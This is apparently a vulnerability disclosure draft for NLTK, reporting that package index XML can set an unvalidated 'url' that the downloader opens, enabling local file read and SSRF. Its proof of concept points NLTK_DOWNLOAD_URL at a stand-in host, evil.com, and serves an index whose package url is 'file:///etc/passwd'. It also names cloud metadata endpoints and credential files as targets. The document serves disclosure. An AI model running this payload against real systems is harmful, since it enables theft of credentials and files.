# NLTK: Arbitrary File Read / SSRF via Unvalidated `url` in Package XML

**Date:** 2026-03-23
**Target:** NLTK (Natural Language Toolkit)
**Status:** READY TO SUBMIT
**Severity:** High (CVSS ~7.7)
**Distinct from:** CVE-2026-33236 (that only fixed `subdir`/`id`, NOT `url`)

## Vulnerable Files
- `nltk/downloader.py:235` — `self.url = url` (no validation)
- `nltk/downloader.py:718` — `infile = urlopen(info.url)` (uses unvalidated url)
- `nltk/downloader.py:2720` — `default=os.environ.get("NLTK_DOWNLOAD_URL")` (attack vector)
- `nltk/pathsec.py:24` — `ENFORCE = False` (security checks are advisory-only)

## Attack Vectors
1. `NLTK_DOWNLOAD_URL` env var → attacker controls XML index URL
2. `server_index_url` param to `Downloader()` / `nltk.download()`

## PoC
```python
import os, nltk

os.environ["NLTK_DOWNLOAD_URL"] = "http://evil.com/index.xml"
nltk.download("evil")
# /etc/passwd written to ~/nltk_data/corpora/evil
```

Attacker's `index.xml`:
```xml
<nltk_data>
  <packages>
    <package id="evil" url="file:///etc/passwd" size="999999"
             unzipped_size="999999" subdir="corpora" unzip="0"
             checksum="abc" name="evil"/>
  </packages>
</nltk_data>
```

## Root Cause
1. `Package.__init__` validates `subdir` and `id` (CVE-2026-33236 fix) but NOT `url`
2. `pathsec.ENFORCE=False` → SSRF detection in `validate_network_url()` only warns, never blocks
3. `urllib.request.build_opener()` includes `FileHandler` → `file://` URLs work on Unix

## Impact
- Arbitrary local file read (SSH keys, .env files, credentials)
- SSRF to internal services (cloud metadata: `http://169.254.169.254/...`)
- Particularly dangerous in CI/CD, cloud, shared Jupyter environments

## Notes
- No checksum validation during download (lines 717-734)
- The fix for CVE-2026-33236 explicitly did NOT fix the `url` field
- This is a NEW finding not covered by any existing CVE
